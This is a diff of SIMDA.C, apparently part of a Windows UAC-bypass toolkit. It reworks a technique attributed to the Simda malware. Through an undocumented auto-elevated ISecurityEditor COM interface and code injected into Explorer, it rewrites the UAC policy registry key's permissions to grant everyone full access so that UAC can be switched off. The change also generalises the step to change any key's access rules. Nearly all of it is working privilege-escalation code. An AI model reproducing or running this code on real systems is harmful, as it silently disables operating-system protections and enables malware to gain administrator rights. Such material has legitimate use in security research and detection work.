@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     1.10
+*  VERSION:     1.50
 *
-*  DATE:        28 Mar 2015
+*  DATE:        05 Apr 2015
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -59,8 +59,9 @@ DWORD WINAPI ucmElevatedDisableProc(
 			break;
 		}
 
-		if (SecurityEditor1 != NULL)
+		if (SecurityEditor1 != NULL) {
 			SecurityEditor1->lpVtbl->Release(SecurityEditor1);
+		}
 
 		bop.cbStruct = sizeof(bop);
 		bop.dwClassContext = CLSCTX_LOCAL_SERVER;
@@ -100,33 +101,51 @@ DWORD WINAPI ucmElevatedDisableProc(
 
 	} while (cond);
 
-	if (SecurityEditor1 != NULL)
+	if (SecurityEditor1 != NULL) {
 		SecurityEditor1->lpVtbl->Release(SecurityEditor1);
+	}
 
 	elvpar->xCoUninitialize();
 
 	return r;
 }
 
-
 /*
-* ucmSimdaTurnOffUac
+* ucmSimdaAlterKeySecurity
 *
 * Purpose:
 *
-* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
-* Used by WinNT/Simda starting from 2010 year till today.
+* Set new entry in key DACL.
 *
 */
-BOOL ucmSimdaTurnOffUac(
-	VOID
+BOOL ucmSimdaAlterKeySecurity(
+	LPWSTR lpTargetKey,
+	LPWSTR lpSddlString
 	)
 {
 	BOOL		cond = FALSE, bResult = FALSE;
-	DWORD		dwValue;
-	LRESULT		lRet;
-	HKEY		hKey;
 	HINSTANCE   hKrnl, hOle32, hShell32;
+
+	SIZE_T		cch;
+
+	//just a basic check
+	if (
+		(lpTargetKey == NULL) ||
+		(lpSddlString == NULL)
+		)
+	{
+		return FALSE;
+	}
+
+	cch = _strlen_w(lpTargetKey);
+	if ((cch == 0) || (cch > MAX_PATH)) {
+		return FALSE;
+	}
+	cch = _strlen_w(lpSddlString);
+	if ((cch == 0) || (cch > MAX_PATH)) {
+		return FALSE;
+	}
+
 
 	do {
 
@@ -153,9 +172,9 @@ BOOL ucmSimdaTurnOffUac(
 			}
 		}
 
-		lstrcpyW(g_ElevParams2.EleMoniker, L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}");
-		lstrcpyW(g_ElevParams2.szKey, L"MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system");
-		lstrcpyW(g_ElevParams2.szNewSDDL, L"D:(A;;GA;;;WD)");
+		_strcpy_w(g_ElevParams2.EleMoniker, L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}");
+		_strcpy_w(g_ElevParams2.szKey, lpTargetKey);
+		_strcpy_w(g_ElevParams2.szNewSDDL, lpSddlString);
 
 		if (CLSIDFromString(L"{4D111E08-CBF7-4f12-A926-2C7920AF52FC}",
 			&g_ElevParams2.xCLSID_ShellSecurityEditor) != NOERROR)
@@ -163,8 +182,8 @@ BOOL ucmSimdaTurnOffUac(
 			break;
 		}
 
-		if (IIDFromString(L"{14B2C619-D07A-46EF-8B62-31B64F3B845C}", 
-			&g_ElevParams2.xIID_ISecurityEditor) != S_OK) 
+		if (IIDFromString(L"{14B2C619-D07A-46EF-8B62-31B64F3B845C}",
+			&g_ElevParams2.xIID_ISecurityEditor) != S_OK)
 		{
 			break;
 		}
@@ -176,10 +195,45 @@ BOOL ucmSimdaTurnOffUac(
 		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(hKrnl, "OutputDebugStringW");
 
 		bResult = ucmInjectExplorer(&g_ElevParams2, ucmElevatedDisableProc);
+		Sleep(2000);
+
+	} while (cond);
+
+	return bResult;
+}
+
+/*
+* ucmSimdaTurnOffUac
+*
+* Purpose:
+*
+* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
+* Used by WinNT/Simda starting from 2010 year till today.
+*
+*/
+BOOL ucmSimdaTurnOffUac(
+	VOID
+	)
+{
+	BOOL		cond = FALSE, bResult = FALSE;
+	DWORD		dwValue;
+	LRESULT		lRet;
+	HKEY		hKey;
+
+	do {
+
+		if (!ucmSimdaAlterKeySecurity(
+			T_UACKEY,
+			T_SSDL_ALL_FOR_EVERYONE)
+			)
+		{
+			break;
+		}
 
 		if (bResult) {
+
 			Sleep(1000);
-			
+		
 			lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,	TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system"), 
 				0, KEY_ALL_ACCESS, &hKey);
 			if ((lRet == ERROR_SUCCESS) && (hKey != NULL)) {
